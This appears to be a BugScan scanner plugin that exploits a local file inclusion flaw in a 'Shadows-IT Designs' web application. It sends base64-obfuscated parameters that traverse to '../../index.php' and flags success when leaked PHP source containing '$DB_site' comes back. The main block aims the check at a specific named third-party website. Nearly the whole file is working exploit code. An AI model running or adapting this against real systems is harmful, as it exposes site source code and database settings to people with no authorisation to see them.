#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:Shadows-IT Designs Local File Inclusion
#Refer:https://www.bugscan.net/#!/x/2042
#Author:烽火戏诸侯

def assign(service, arg):
    if service == 'shadows-it':
        return True, arg
    
def audit(arg):
    payload ='admin/selector.php?page=dXBsb2FkX2ZpbGU=&op=ZHJhd19jYXRfcGhvdG8=&id=Li4vLi4vaW5kZXgucGhw'
    target=arg+payload
    code, head, res, errcode, _ = curl.curl2(target) 
    if code == 200 and '$DB_site' in res:
        security_hole('LFI:'+target)
    
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('shadows-it','http://www.ekhaa.org.sa/')[1])